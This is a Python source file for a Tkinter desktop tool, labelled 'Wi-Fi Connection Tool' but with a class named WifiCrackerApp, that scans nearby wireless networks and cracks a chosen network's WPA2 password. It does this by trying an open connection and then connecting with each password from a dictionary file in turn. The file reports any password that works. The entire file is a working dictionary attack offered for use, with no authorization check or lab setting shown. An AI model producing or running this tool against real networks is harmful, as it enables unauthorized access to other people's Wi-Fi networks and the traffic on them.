import time
import pywifi
from pywifi import const
import tkinter as tk
from tkinter import ttk, messagebox
import threading

class WifiCrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Connection Tool")
        self.root.geometry("400x400")

        self.wifi = pywifi.PyWiFi()
        self.interfaces = self.wifi.interfaces()
        self.selected_interface = None
        self.stop_event = threading.Event()
        self.is_running = False

        if not self.interfaces:
            messagebox.showerror("Error", "No Wi-Fi interfaces found.")
            self.root.destroy()
            return

        self.setup_ui()

    def setup_ui(self):
        # Interface Selection
        tk.Label(self.root, text="Select Wi-Fi Interface:").pack(pady=5)
        self.interface_names = [interface.name() for interface in self.interfaces]
        self.interface_combobox = ttk.Combobox(self.root, values=self.interface_names)
        self.interface_combobox.pack(pady=5)
        self.interface_combobox.bind("<<ComboboxSelected>>", self.on_interface_select)

        # SSID Selection
        tk.Label(self.root, text="Select Wi-Fi Network:").pack(pady=5)
        self.ssid_combobox = ttk.Combobox(self.root, state="disabled")
        self.ssid_combobox.pack(pady=5)

        # Status Label
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        self.status_label = tk.Label(self.root, textvariable=self.status_var, wraplength=380)
        self.status_label.pack(pady=20)

        # Buttons
        self.btn_frame = tk.Frame(self.root)
        self.btn_frame.pack(pady=10)

        self.start_btn = tk.Button(self.btn_frame, text="Start Crack", command=self.start_crack, state="disabled")
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(self.btn_frame, text="Stop", command=self.stop_crack, state="disabled")
        self.stop_btn.pack(side=tk.LEFT, padx=5)

    def on_interface_select(self, event):
        index = self.interface_combobox.current()
        if index >= 0:
            self.selected_interface = self.interfaces[index]
            self.status_var.set("Scanning for networks...")
            self.root.update()
            
            # Run scan in a separate thread
            threading.Thread(target=self.scan_networks, daemon=True).start()

    def scan_networks(self):
        try:
            self.selected_interface.scan()
            time.sleep(5)  # Wait for scan
            scan_results = self.selected_interface.scan_results()
            
            # Filter and sort unique SSIDs
            ssids = sorted(list(set([result.ssid for result in scan_results if result.ssid])))
            
            def update_ui():
                self.ssid_combobox['values'] = ssids
                if ssids:
                    self.ssid_combobox.current(0)
                    self.ssid_combobox.config(state="readonly")
                    self.start_btn.config(state="normal")
                self.status_var.set(f"Scan complete. Found {len(ssids)} networks.")
            
            self.root.after(0, update_ui)
        except Exception as e:
            self.root.after(0, lambda: self.status_var.set(f"Scan failed: {str(e)}"))

    def start_crack(self):
        if self.is_running:
            return
            
        ssid = self.ssid_combobox.get()
        if not ssid:
            messagebox.showwarning("Warning", "Please select a network first.")
            return

        self.is_running = True
        self.stop_event.clear()
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.interface_combobox.config(state="disabled")
        self.ssid_combobox.config(state="disabled")
        
        threading.Thread(target=self.crack_wifi, args=(ssid,), daemon=True).start()

    def stop_crack(self):
        if self.is_running:
            self.status_var.set("Stopping...")
            self.stop_event.set()

    def crack_wifi(self, ssid):
        try:
            # 1. Try Open Network first
            self.status_var.set(f"Attempting to connect to {ssid} (Open)...")
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_NONE)
            
            if self.connect(profile):
                self.root.after(0, lambda: self.success(ssid, "OPEN (No Password)"))
                return

            # 2. Try Passwords from file
            self.status_var.set("Open connection failed. Trying passwords...")
            
            try:
                # Open file with buffering for performance, but read line by line
                with open('output.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if self.stop_event.is_set():
                            self.root.after(0, self.reset_ui)
                            return

                        password = line.strip()
                        if not password:
                            continue

                        self.root.after(0, lambda p=password: self.status_var.set(f"Trying: {p}"))
                        
                        profile = pywifi.Profile()
                        profile.ssid = ssid
                        profile.auth = const.AUTH_ALG_OPEN
                        profile.akm.append(const.AKM_TYPE_WPA2PSK)
                        profile.cipher = const.CIPHER_TYPE_CCMP
                        profile.key = password

                        if self.connect(profile):
                            self.root.after(0, lambda: self.success(ssid, password))
                            return
                            
            except FileNotFoundError:
                self.root.after(0, lambda: messagebox.showerror("Error", "output.txt not found!"))
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("Error", f"File error: {str(e)}"))

            if not self.stop_event.is_set():
                self.root.after(0, lambda: messagebox.showinfo("Result", f"Failed to crack {ssid} with provided dictionary."))
                
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"An error occurred: {str(e)}"))
        finally:
            self.root.after(0, self.reset_ui)

    def connect(self, profile):
        self.selected_interface.remove_all_network_profiles()
        tmp_profile = self.selected_interface.add_network_profile(profile)
        self.selected_interface.connect(tmp_profile)
        
        # Wait for connection
        start_time = time.time()
        while time.time() - start_time < 5: # 5 second timeout
            if self.stop_event.is_set():
                return False
            if self.selected_interface.status() == const.IFACE_CONNECTED:
                return True
            time.sleep(0.1)
        
        return False

    def success(self, ssid, password):
        messagebox.showinfo("Success", f"Connected to {ssid}!\nPassword: {password}")
        self.status_var.set(f"Connected: {ssid} ({password})")

    def reset_ui(self):
        self.is_running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.interface_combobox.config(state="readonly")
        self.ssid_combobox.config(state="readonly")
        if not self.status_var.get().startswith("Connected"):
             self.status_var.set("Ready")

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiCrackerApp(root)
    root.mainloop()